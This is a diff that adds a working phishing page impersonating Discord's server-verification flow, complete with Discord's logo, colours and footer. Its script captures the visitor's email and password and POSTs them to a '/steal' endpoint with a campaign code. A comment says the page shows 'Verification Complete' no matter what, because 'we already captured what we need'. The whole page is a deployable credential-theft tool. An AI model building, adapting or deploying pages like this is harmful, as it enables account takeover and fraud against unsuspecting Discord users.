@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Discord — Server Verification</title>
+  <link rel="icon" href="https://discord.com/assets/favicon.ico" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #313338;
+      color: #dbdee1;
+      font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .logo {
+      margin-bottom: 24px;
+    }
+    .logo svg { width: 52px; height: 52px; }
+
+    .card {
+      background: #2b2d31;
+      border-radius: 8px;
+      padding: 32px 32px 28px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #f2f3f5;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #b5bac1;
+      text-align: center;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    /* step 1 — intro */
+    #step-intro .server-info {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: #1e1f22;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+    .server-icon {
+      width: 48px; height: 48px;
+      border-radius: 50%;
+      background: #5865f2;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 20px; font-weight: 700; color: #fff; flex-shrink: 0;
+    }
+    .server-name { font-size: 16px; font-weight: 600; color: #f2f3f5; }
+    .server-meta { font-size: 13px; color: #b5bac1; margin-top: 2px; }
+
+    .checklist { list-style: none; margin-bottom: 24px; }
+    .checklist li {
+      display: flex; align-items: flex-start; gap: 10px;
+      font-size: 14px; color: #b5bac1; margin-bottom: 12px; line-height: 1.4;
+    }
+    .checklist li::before {
+      content: '✓';
+      color: #23a55a; font-weight: 700; flex-shrink: 0; margin-top: 1px;
+    }
+
+    /* step 2 — login form */
+    #step-login { display: none; }
+
+    .field { margin-bottom: 20px; }
+    .field label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .02em;
+      color: #b5bac1;
+      margin-bottom: 8px;
+    }
+    .field label span { color: #f23f43; margin-left: 2px; }
+    .field input {
+      width: 100%;
+      background: #1e1f22;
+      border: 1px solid #1e1f22;
+      border-radius: 3px;
+      color: #dbdee1;
+      font-size: 16px;
+      padding: 10px;
+      outline: none;
+      transition: border-color .15s;
+    }
+    .field input:focus { border-color: #5865f2; }
+    .field input::placeholder { color: #4e5058; }
+
+    /* shared button */
+    .btn {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .15s, opacity .15s;
+    }
+    .btn-primary { background: #5865f2; color: #fff; }
+    .btn-primary:hover { background: #4752c4; }
+    .btn-primary:disabled { opacity: .6; cursor: not-allowed; }
+
+    /* step 3 — success */
+    #step-success { display: none; text-align: center; }
+    .success-icon {
+      width: 64px; height: 64px;
+      background: #23a55a;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+
+    .error-msg {
+      background: #f23f4322;
+      border: 1px solid #f23f43;
+      border-radius: 4px;
+      color: #f23f43;
+      font-size: 13px;
+      padding: 10px 12px;
+      margin-bottom: 16px;
+      display: none;
+    }
+
+    .back-link {
+      font-size: 13px;
+      color: #00a8fc;
+      cursor: pointer;
+      margin-top: 16px;
+      display: block;
+      text-align: center;
+      text-decoration: none;
+    }
+    .back-link:hover { text-decoration: underline; }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #4e5058;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Discord wordmark -->
+  <div class="logo">
+    <svg viewBox="0 -28.5 256 256" xmlns="http://www.w3.org/2000/svg">
+      <path d="M216.856 16.597A208.502 208.502 0 0 0 164.042 0c-2.275 4.113-4.933 9.645-6.766 14.046-19.692-2.961-39.203-2.961-58.533 0-1.832-4.4-4.55-9.933-6.846-14.046a207.82 207.82 0 0 0-52.855 16.638C5.618 67.147-3.443 116.4 1.087 164.956c22.169 16.555 43.653 26.612 64.775 33.193A161.094 161.094 0 0 0 79.735 175.3a136.413 136.413 0 0 1-21.846-10.632 108.636 108.636 0 0 0 5.356-4.237c42.122 19.702 87.89 19.702 129.51 0a131.66 131.66 0 0 0 5.355 4.237 136.07 136.07 0 0 1-21.886 10.653c4.006 8.02 8.638 15.67 13.873 22.848 21.142-6.58 42.646-16.637 64.815-33.213 5.316-56.288-9.08-105.09-38.056-148.36ZM85.474 135.095c-12.645 0-23.015-11.805-23.015-26.18s10.149-26.2 23.015-26.2c12.867 0 23.236 11.804 23.015 26.2.02 14.375-10.148 26.18-23.015 26.18Zm85.051 0c-12.645 0-23.014-11.805-23.014-26.18s10.148-26.2 23.014-26.2c12.867 0 23.236 11.804 23.015 26.2 0 14.375-10.148 26.18-23.015 26.18Z" fill="#5865F2"/>
+    </svg>
+  </div>
+
+  <div class="card">
+
+    <!-- ── STEP 1: intro ───────────────────────────────── -->
+    <div id="step-intro">
+      <h1>Server Verification</h1>
+      <p class="subtitle">To access this server you must verify your Discord account.</p>
+
+      <div class="server-info">
+        <div class="server-icon">V</div>
+        <div>
+          <div class="server-name">Verified Members</div>
+          <div class="server-meta">🔒 Restricted access · Verification required</div>
+        </div>
+      </div>
+
+      <ul class="checklist">
+        <li>Confirm you are a real Discord user</li>
+        <li>Agree to the server's rules and guidelines</li>
+        <li>Unlock access to all server channels</li>
+      </ul>
+
+      <button class="btn btn-primary" onclick="showLogin()">
+        Verify with Discord
+      </button>
+    </div>
+
+    <!-- ── STEP 2: login form ──────────────────────────── -->
+    <div id="step-login">
+      <h1>Sign In</h1>
+      <p class="subtitle">Enter your Discord credentials to complete verification.</p>
+
+      <div class="error-msg" id="error-msg">Invalid email or password.</div>
+
+      <div class="field">
+        <label>Email or Phone Number <span>*</span></label>
+        <input type="email" id="inp-email" placeholder="Enter your email" autocomplete="email" />
+      </div>
+      <div class="field">
+        <label>Password <span>*</span></label>
+        <input type="password" id="inp-pass" placeholder="Enter your password" autocomplete="current-password" />
+      </div>
+
+      <button class="btn btn-primary" id="btn-submit" onclick="submitCredentials()">
+        Log In
+      </button>
+
+      <a class="back-link" onclick="showIntro()">← Back</a>
+    </div>
+
+    <!-- ── STEP 3: success ────────────────────────────── -->
+    <div id="step-success">
+      <div class="success-icon">✓</div>
+      <h1>Verification Complete</h1>
+      <p class="subtitle" style="margin-bottom:0">
+        You've been successfully verified. You can now access the server.<br><br>
+        <strong style="color:#f2f3f5">You may close this tab.</strong>
+      </p>
+    </div>
+
+  </div>
+
+  <p class="footer">discord.com · Terms · Privacy</p>
+
+  <script>
+    const CODE = '{{CODE}}';
+
+    function showLogin() {
+      document.getElementById('step-intro').style.display = 'none';
+      document.getElementById('step-login').style.display = 'block';
+      setTimeout(() => document.getElementById('inp-email').focus(), 50);
+    }
+
+    function showIntro() {
+      document.getElementById('step-login').style.display = 'none';
+      document.getElementById('step-intro').style.display = 'block';
+    }
+
+    // allow Enter key submission
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Enter' && document.getElementById('step-login').style.display !== 'none') {
+        submitCredentials();
+      }
+    });
+
+    async function submitCredentials() {
+      const email = document.getElementById('inp-email').value.trim();
+      const pass  = document.getElementById('inp-pass').value;
+      const btn   = document.getElementById('btn-submit');
+      const errEl = document.getElementById('error-msg');
+
+      if (!email || !pass) {
+        errEl.textContent = 'Please enter your email and password.';
+        errEl.style.display = 'block';
+        return;
+      }
+
+      btn.disabled    = true;
+      btn.textContent = 'Verifying…';
+      errEl.style.display = 'none';
+
+      try {
+        const res = await fetch('/steal', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ code: CODE, email, password: pass }),
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          // always show success regardless of credential validity —
+          // we already captured what we need
+          document.getElementById('step-login').style.display  = 'none';
+          document.getElementById('step-success').style.display = 'block';
+        } else {
+          throw new Error('server error');
+        }
+      } catch {
+        errEl.textContent    = 'Verification failed. Please try again.';
+        errEl.style.display  = 'block';
+        btn.disabled         = false;
+        btn.textContent      = 'Log In';
+      }
+    }
+  </script>
+</body>
+</html>
